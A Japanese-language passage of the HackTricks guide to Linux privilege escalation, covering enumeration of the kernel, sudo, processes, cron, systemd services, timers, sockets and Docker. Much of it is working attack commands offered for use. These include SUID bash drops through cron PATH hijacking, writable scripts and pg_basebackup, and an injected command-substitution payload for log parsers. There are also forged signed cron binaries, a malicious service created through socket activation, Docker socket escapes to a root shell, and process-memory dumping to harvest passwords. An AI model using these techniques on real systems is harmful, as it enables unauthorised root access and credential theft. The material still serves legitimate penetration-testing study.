# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## システム情報

### OS 情報

実行中のOSの情報を収集し始めましょう。
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

もし`PATH`変数内の任意のフォルダに対して**書き込み権限がある**場合、いくつかのライブラリやバイナリをハイジャックできる可能性があります：
```bash
echo $PATH
```
### 環境情報

環境変数に、興味深い情報、passwords、またはAPI keysが含まれていますか？
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

カーネルのバージョンを確認し、escalate privileges に使える exploit があるか調べる
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
良い脆弱な kernel のリストや、いくつかの既に **compiled exploits** はここで見つけられます: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) and [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
他にも **compiled exploits** が見つかるサイト: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

そのサイトから脆弱な kernel のバージョンをすべて抽出するには、次のようにします:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
カーネルエクスプロイトを検索するのに役立つツール：

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (実行は被害者上で、kernel 2.x のエクスプロイトのみをチェック)

常に **Googleでカーネルバージョンを検索してください**。カーネルバージョンが特定のエクスプロイトに記載されている場合があり、そのエクスプロイトが有効であることを確認できます。

追加のカーネルエクスプロイト手法：

{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo バージョン

以下に表示される脆弱な sudo バージョンに基づいて:
```bash
searchsploit sudo
```
このgrepを使って、sudoのバージョンが脆弱かどうか確認できます。
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

Sudo の 1.9.17p1 より古いバージョン（**1.9.14 - 1.9.17 < 1.9.17p1**）では、`/etc/nsswitch.conf` ファイルがユーザー管理下のディレクトリから使用される場合、sudo `--chroot` オプションを介して特権のないローカルユーザーが root に権限昇格できる脆弱性があります。

該当の [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463) を利用する [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) はこちらです。実行する前に、`sudo` のバージョンが脆弱であり、`chroot` 機能をサポートしていることを確認してください。

詳細については、オリジナルの [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/) を参照してください。

#### sudo < v1.8.28

出典: @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg の署名検証に失敗

**smasher2 box of HTB** を確認してください。そこにこの vuln がどのように悪用され得るかの**例**があります。
```bash
dmesg 2>/dev/null | grep "signature"
```
### 追加のシステム列挙
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## 考えられる防御策の列挙

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Container Breakout

container内にいる場合は、まず以下の container-security セクションから始め、runtime-specific abuse pages にピボットしてください:


{{#ref}}
container-security/
{{#endref}}

## ドライブ

どこに何が**マウントされているか／マウントされていないか**、どこでそしてなぜを確認してください。もし何かがマウントされていなければ、それをマウントして機密情報がないか確認してみてください
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## 有用なソフトウェア

有用なバイナリを列挙する
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
また、**コンパイラがインストールされているか**確認してください。これは、kernel exploit を使う場合に役立ちます。kernel exploit は、使用するマシン（またはそれに類似したマシン）でコンパイルすることが推奨されるからです。
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### 脆弱なソフトウェアがインストールされている

**インストールされているパッケージとサービスのバージョン**を確認してください。例えば、古い Nagios バージョンが存在し、それが悪用されて escalating privileges を引き起こす可能性があります…\
より疑わしいインストール済みソフトウェアのバージョンは手動で確認することを推奨します。
```bash
dpkg -l #Debian
rpm -qa #Centos
```
マシンにSSHでアクセスできる場合、インストールされている古いまたは脆弱なソフトウェアを確認するために **openVAS** を使用することもできます。

> [!NOTE] > _これらのコマンドは大量の情報を表示し、その多くは役に立たない可能性があります。したがって、OpenVAS や類似のツールなど、インストールされているソフトウェアのバージョンが既知の exploits に対して脆弱かどうかをチェックするアプリケーションを使用することを推奨します_

## Processes

どの**プロセスが実行されているか**を確認し、任意のプロセスが**本来より多くの権限を持っていないか**をチェックしてください（例えば root によって実行されている tomcat など）
```bash
ps aux
ps -ef
top -n 1
```
Always check for possible [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** detect those by checking the `--inspect` parameter inside the command line of the process.\
また、**プロセスのバイナリに対する自分の権限を確認してください**。上書きできる可能性があります。

### Process monitoring

プロセスの監視には [**pspy**](https://github.com/DominicBreuker/pspy) のようなツールを使用できます。これにより、脆弱なプロセスが頻繁に実行されている場合や特定の条件が満たされたときにそれらを特定するのに非常に有用です。

### Process memory

サーバの一部のサービスは、**メモリ内に資格情報を平文で保存する**ことがあります。\
通常、他ユーザに属するプロセスのメモリを読むには**root 権限**が必要なため、これは既に root の場合に追加の資格情報を発見するのに役立ちます。\
ただし、**通常ユーザとしては自分が所有するプロセスのメモリを読むことができる**ことを忘れないでください。

> [!WARNING]
> 現在ほとんどのマシンではデフォルトで**ptrace を許可していない**ことに注意してください。つまり、非特権ユーザが所有する他のプロセスをダンプできない可能性があります。
>
> ファイル _**/proc/sys/kernel/yama/ptrace_scope**_ は ptrace へのアクセス制御を行います:
>
> - **kernel.yama.ptrace_scope = 0**: 同一の uid を持つ限り全てのプロセスをデバッグできます。これは従来の ptrace の動作方法です。
> - **kernel.yama.ptrace_scope = 1**: 親プロセスのみデバッグ可能です。
> - **kernel.yama.ptrace_scope = 2**: ptrace を使用できるのは管理者のみ（CAP_SYS_PTRACE が必要）です。
> - **kernel.yama.ptrace_scope = 3**: ptrace でトレースできるプロセスはありません。一度設定すると、再び ptrace を有効にするには再起動が必要です。

#### GDB

FTP サービスなどのメモリにアクセスできる場合、Heap を取得してその中の資格情報を検索できます。
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB スクリプト
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

指定したプロセスIDに対して、maps はそのプロセスの仮想アドレス空間内でメモリがどのようにマッピングされているかを示します。また、各マッピング領域のアクセス権（permissions）も表示します。mem 擬似ファイルはプロセスのメモリ自体を公開します。maps ファイルからどのメモリ領域が読み取り可能かとそのオフセットが分かります。この情報を使って mem ファイルをシークし、読み取り可能なすべての領域をファイルにダンプします。
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` はシステムの**物理**メモリにアクセスするためのデバイスであり、仮想メモリにはアクセスしません。カーネルの仮想アドレス空間には /dev/kmem を使ってアクセスできます。\
通常、`/dev/mem` は **root** と **kmem** グループのみに読み取り可能です。
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump for linux

ProcDump は Windows の Sysinternals スイートにある古典的な ProcDump ツールの Linux 向け再設計です。入手先: [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### ツール

プロセスメモリをダンプするには次を使用できます:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_手動でroot要件を削除し、あなたが所有するプロセスをダンプできます
- Script A.5 from [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (rootが必要)

### プロセスメモリからの認証情報

#### 手動の例

authenticatorプロセスが実行中である場合:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
プロセスをdumpして（プロセスのmemoryをdumpするさまざまな方法は前のセクションを参照してください）memory内のcredentialsを検索できます:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

このツール [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) は、メモリから**clear text credentials**を盗み、いくつかの**well known files**からも取得します。正しく動作させるには root 権限が必要です。

| 機能                                              | プロセス名             |
| ------------------------------------------------- | ---------------------- |
| GDM password (Kali Desktop, Debian Desktop)       | gdm-password           |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon   |
| LightDM (Ubuntu Desktop)                          | lightdm                |
| VSFTPd (Active FTP Connections)                   | vsftpd                 |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2                |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                  |

#### 検索用正規表現/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## スケジュール/Cron ジョブ

### Crontab UI (alseambusher) が root で実行されている — web-based scheduler privesc

もし web “Crontab UI” パネル (alseambusher/crontab-ui) が root として実行され、loopback にのみバインドされている場合でも、SSH local port-forwarding 経由で到達して権限昇格できるジョブを作成できます。

典型的なチェーン
- loopback-only ポート（例: 127.0.0.1:8000）と Basic-Auth realm を `ss -ntlp` / `curl -v localhost:8000` で発見
- 運用アーティファクト内の認証情報を探す:
- バックアップ/スクリプト（`zip -P <password>`）
- systemd unit に `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."` として露出
- トンネルを張ってログイン:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- 高権限のジョブを作成して即実行する（SUID shellをドロップする）:
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- 使用する:
```bash
/tmp/rootshell -p   # root shell
```
ハードニング
- Crontab UIをrootで実行しない; 専用のuserで最小権限に制限する
- localhostにbindし、さらにfirewall/VPNでアクセスを制限する; passwordsを使い回さない
- unit filesに秘密を埋め込まない; secret storesまたはroot-onlyのEnvironmentFileを使用する
- オンデマンドのjob executionsに対してaudit/loggingを有効にする

scheduled jobが脆弱かどうか確認する。rootで実行されるscriptを悪用できるかもしれない（wildcard vuln? rootが使用するファイルをmodifyできるか? symlinksを使えるか? rootが使用するディレクトリに特定のファイルを作成できるか?）。
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron path

例えば、_/etc/crontab_ 内では次のように PATH が設定されていることがあります: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_user が /home/user に書き込み権限を持っている点に注意_)

もしこの crontab の中で root ユーザが PATH を設定せずにコマンドやスクリプトを実行しようとした場合。例えば: _\* \* \* \* root overwrite.sh_\

その場合、次のようにして root シェルを取得できます:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### ワイルドカードを含むスクリプトをCronで実行している場合 (Wildcard Injection)

スクリプトがrootによって実行され、コマンド内に“**\***”が含まれている場合、これを悪用して予期しない動作（privescなど）を引き起こすことができます。例:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**If the wildcard がパスの直前にある場合** _**/some/path/\***_ **, 脆弱ではありません（** _**./\***_ **も同様です）。**

以下のページを読んで、より多くの wildcard exploitation tricks を確認してください：


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash における arithmetic expansion injection が cron ログパーサに与える影響

Bash は ((...))、$((...)) および let の算術評価の前に parameter expansion と command substitution を実行します。もし root が実行する cron/パーサが信頼できないログフィールドを読み取り、それを算術コンテキストに渡すと、攻撃者は command substitution $(...) を注入でき、cron 実行時に root として実行されます。

- Why it works: Bash では展開は次の順序で行われます: parameter/variable expansion, command substitution, arithmetic expansion, その後 word splitting と pathname expansion。したがって `$(/bin/bash -c 'id > /tmp/pwn')0` のような値はまず置換され（コマンドが実行され）、残った数値 `0` が算術に使われるためスクリプトはエラーなく続行します。

- Typical vulnerable pattern:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation: 解析されるログに攻撃者が制御するテキストを書き込み、数値に見えるフィールドに command substitution を含ませ末尾が数字になるようにします。コマンドが stdout に出力しない（またはリダイレクトする）ことを確認して、算術が有効なままにしてください。
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron スクリプト上書きと symlink

もし root によって実行される cron script を変更できるなら、非常に簡単に shell を取得できます：
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
rootによって実行されるscriptが**あなたが完全にアクセスできるdirectory**を使用している場合、そのfolderを削除して、あなたが制御するscriptを配置した別の場所へ向ける**symlink folderを作成する**ことが有用かもしれません。
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Symlink の検証とより安全なファイル処理

パスでファイルを読み書きする特権 scripts/binaries をレビューする際は、リンクがどのように扱われているかを確認してください：

- `stat()` は symlink をたどり、ターゲットのメタデータを返します。
- `lstat()` はリンク自身のメタデータを返します。
- `readlink -f` と `namei -l` は最終ターゲットを解決し、各パスコンポーネントの権限を表示するのに役立ちます。
```bash
readlink -f /path/to/link
namei -l /path/to/link
```
For defenders/developers, safer patterns against symlink tricks include:

- `O_EXCL` with `O_CREAT`: 既にパスが存在する場合に失敗させる（攻撃者が事前に作成したリンク/ファイルをブロック）。
- `openat()`: 信頼できるディレクトリのファイル記述子を基準に操作する。
- `mkstemp()`: 安全な権限で一時ファイルを原子的に作成する。

### Custom-signed cron binaries with writable payloads
Blue teams は時に、カスタム ELF セクションをダンプしてベンダー文字列を grep で確認した後に root として実行することで、cron 駆動バイナリに「署名」を行います。もしそのバイナリがグループ書き込み可能（例: `/opt/AV/periodic-checks/monitor` が `root:devs 770`）で、署名素材をleakできるなら、セクションを偽造して cron タスクを乗っ取ることができます。

1. `pspy` を使って検証フローをキャプチャする。Era では、root が `objcopy --dump-section .text_sig=text_sig_section.bin monitor` を実行し、続けて `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin` を実行してからファイルを実行していました。
2. 漏えいした鍵/設定（`signing.zip` から）を使って期待される証明書を再作成する:
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. 悪意ある置換バイナリを作成する（例: SUID bash を落とす、your SSH key を追加する）とともに、証明書を `.text_sig` に埋め込んで grep を通過させる:
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. 実行ビットを保持したままスケジュールされたバイナリを上書きする:
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. 次の cron 実行を待つ。素朴な署名チェックが成功すると、あなたのペイロードが root として実行される。

### Frequent cron jobs

プロセスを監視して、1分、2分、5分ごとに実行されているプロセスを探すことができます。これを利用して権限昇格できる可能性があります。

例えば、**monitor every 0.1s during 1 minute**、**sort by less executed commands**、および最も多く実行されたコマンドを削除するには、次のようにします:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**また使うことができます** [**pspy**](https://github.com/DominicBreuker/pspy/releases)（これにより開始されるすべてのプロセスを監視・一覧表示します）。

### rootバックアップで攻撃者が設定したmode bitsを保持する (pg_basebackup)

もし root 所有の cron が `pg_basebackup`（または任意の再帰的コピー）を、あなたが書き込み可能なデータベースディレクトリに対して実行しているなら、**SUID/SGID binary** を植え付けることができ、それが同じ mode bits で **root:root** としてバックアップ出力に再コピーされます。

典型的な発見フロー（低権限のDBユーザとして）:
- `pspy` を使って、root の cron が毎分 `/usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/` のようなコマンドを呼んでいるのを見つける。
- ソースクラスター（例: `/var/lib/postgresql/14/main`）にあなたが書き込み可能であり、ジョブ実行後に宛先（`/opt/backups/current`）が root 所有になることを確認する。

Exploit:
```bash
# As the DB service user owning the cluster directory
cd /var/lib/postgresql/14/main
cp /bin/bash .
chmod 6777 bash

# Wait for the next root backup run (pg_basebackup preserves permissions)
ls -l /opt/backups/current/bash  # expect -rwsrwsrwx 1 root root ... bash
/opt/backups/current/bash -p    # root shell without dropping privileges
```
これは `pg_basebackup` がクラスターをコピーする際にファイルモードビットを保持するために成立する。root によって呼び出されると、宛先ファイルは **root ownership + attacker-chosen SUID/SGID** を継承する。パーミッションを保持し実行可能な場所に書き込む同様の特権バックアップ/コピー処理も脆弱である。

### 見えない cron jobs

コメントの後に**キャリッジリターンを入れる**（改行文字なしで）cronjob を作成することが可能で、cron job は動作する。例（キャリッジリターン文字に注意）:
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## サービス

### 書き込み可能な _.service_ ファイル

`.service` ファイルに書き込みできるか確認してください。書き込み可能なら、ファイルを**変更して**、サービスが**開始**、**再起動**、または**停止**されたときにあなたの**backdoor を実行する**ようにできます（マシンを再起動するまで待つ必要があるかもしれません）。\  
例えば、.service ファイル内にあなたの backdoor を **`ExecStart=/tmp/script.sh`** として作成します。

### 書き込み可能なサービスバイナリ

**サービスによって実行されるバイナリに対する書き込み権限**がある場合、それらを backdoors に変更して、サービスが再実行されたときに backdoors が実行されるようにできることを覚えておいてください。

### systemd PATH - 相対パス

次のように**systemd**が使用する PATH を確認できます:
```bash
systemctl show-environment
```
パス内のどのフォルダにも**write**できることがわかった場合、**escalate privileges**できる可能性があります。サービス設定ファイルで**relative paths being used on service configurations**のような箇所を探す必要があります：
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
次に、書き込み可能な systemd PATH フォルダ内に、**executable** を **same name as the relative path binary** で作成します。サービスが脆弱なアクション（**Start**, **Stop**, **Reload**）の実行を求められると、あなたの **backdoor** が実行されます（通常、権限のないユーザーはサービスの start/stop を実行できませんが、`sudo -l` が使えるか確認してください）。

**`man systemd.service` でサービスについて詳しく学んでください。**

## **Timers**

**Timers** は名前が `**.timer**` で終わる systemd の unit ファイルで、`**.service**` ファイルやイベントを制御します。**Timers** は calendar time events および monotonic time events をネイティブにサポートし、非同期で実行できるため、cron の代替として使用できます。

You can enumerate all the timers with:
```bash
systemctl list-timers --all
```
### 書き込み可能なタイマー

タイマーを変更できれば、systemd.unit の既存のユニット（`.service` や `.target` など）を実行させることができます。
```bash
Unit=backdoor.service
```
In the documentation you can read what the Unit is:

> このタイマーが期限切れになったときにアクティブ化するユニットです。引数はサフィックスが ".timer" でないユニット名です。指定がない場合、この値はサフィックスを除けばタイマー・ユニットと同じ名前の service にデフォルトされます。（上参照）アクティブ化されるユニット名とタイマー・ユニット名は、サフィックス以外は同一にすることが推奨されます。

Therefore, to abuse this permission you would need to:

- Find some systemd unit (like a `.service`) that is **書き込み可能なバイナリを実行している**
- **相対パスを実行している** systemd ユニットを見つけ、実行ファイルを偽装するために **systemd PATH** に対して **書き込み権限** があること

**Learn more about timers with `man systemd.timer`.**

### **Enabling Timer**

タイマーを有効化するには root 権限が必要で、次のコマンドを実行します:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Note the **timer** is **activated** by creating a symlink to it on `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) enable **process communication** on the same or different machines within client-server models. They utilize standard Unix descriptor files for inter-computer communication and are set up through `.socket` files.

Sockets can be configured using `.socket` files.

**Learn more about sockets with `man systemd.socket`.** Inside this file, several interesting parameters can be configured:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: These options are different but a summary is used to **indicate where it is going to listen** to the socket (the path of the AF_UNIX socket file, the IPv4/6 and/or port number to listen, etc.)
- `Accept`: Takes a boolean argument. If **true**, a **service instance is spawned for each incoming connection** and only the connection socket is passed to it. If **false**, all listening sockets themselves are **passed to the started service unit**, and only one service unit is spawned for all connections. This value is ignored for datagram sockets and FIFOs where a single service unit unconditionally handles all incoming traffic. **Defaults to false**. For performance reasons, it is recommended to write new daemons only in a way that is suitable for `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Takes one or more command lines, which are **executed before** or **after** the listening **sockets**/FIFOs are **created** and bound, respectively. The first token of the command line must be an absolute filename, then followed by arguments for the process.
- `ExecStopPre`, `ExecStopPost`: Additional **commands** that are **executed before** or **after** the listening **sockets**/FIFOs are **closed** and removed, respectively.
- `Service`: Specifies the **service** unit name **to activate** on **incoming traffic**. This setting is only allowed for sockets with Accept=no. It defaults to the service that bears the same name as the socket (with the suffix replaced). In most cases, it should not be necessary to use this option.

### Writable .socket files

If you find a **writable** `.socket` file you can **add** at the beginning of the `[Socket]` section something like: `ExecStartPre=/home/kali/sys/backdoor` and the backdoor will be executed before the socket is created. Therefore, you will **probably need to wait until the machine is rebooted.**\
_Note that the system must be using that socket file configuration or the backdoor won't be executed_

### Socket activation + writable unit path (create missing service)

Another high-impact misconfiguration is:

- a socket unit with `Accept=no` and `Service=<name>.service`
- the referenced service unit is missing
- an attacker can write into `/etc/systemd/system` (or another unit search path)

In that case, the attacker can create `<name>.service`, then trigger traffic to the socket so systemd loads and executes the new service as root.

Quick flow:
```bash
systemctl cat vuln.socket
# [Socket]
# Accept=no
# Service=vuln.service
```

```bash
cat >/etc/systemd/system/vuln.service <<'EOF'
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash'
EOF
nc -q0 127.0.0.1 9999
/var/tmp/rootbash -p
```
### 書き込み可能なソケット

もし**書き込み可能なソケットを特定した場合**（_ここで言うのは Unix Sockets で、設定の `.socket` ファイルのことではありません_）、**そのソケットと通信でき**、脆弱性を突いて悪用できる可能性があります。

### Unix Sockets の列挙
```bash
netstat -a -p --unix
```
### 生の接続
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**エクスプロイトの例:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

注意: **sockets listening for HTTP** リクエストが存在する場合があります（_ここで言っているのは .socket ファイルではなく、unix sockets として動作するファイルのことです_）。次のコマンドで確認できます:
```bash
curl --max-time 2 --unix-socket /path/to/socket/file http://localhost/
```
ソケットが **HTTP リクエストに応答する** 場合、そこに **通信** でき、場合によっては **何らかの脆弱性を悪用できる**。

### 書き込み可能な Docker ソケット

The Docker socket、通常 `/var/run/docker.sock` にあります、は保護すべき重要なファイルです。デフォルトでは、`root` ユーザーと `docker` グループのメンバーが書き込み可能です。このソケットへの書き込み権を持つと、privilege escalation を引き起こす可能性があります。以下に、これを行う方法の内訳と、Docker CLI が利用できない場合の代替手段を示します。

#### **Privilege Escalation with Docker CLI**

Docker ソケットへの書き込み権がある場合、次のコマンドを使用して privilege escalation を行うことができます：
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
これらのコマンドは、ホストのファイルシステムに対する root 権限でコンテナを実行することを可能にします。

#### **Docker API を直接利用する**

Docker CLI が利用できない場合でも、Docker API と `curl` コマンドを使用して Docker ソケットを操作できます。

1.  **List Docker Images:** 利用可能なイメージの一覧を取得します。

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** ホストシステムのルートディレクトリをマウントするコンテナを作成するリクエストを送信します。

```bash
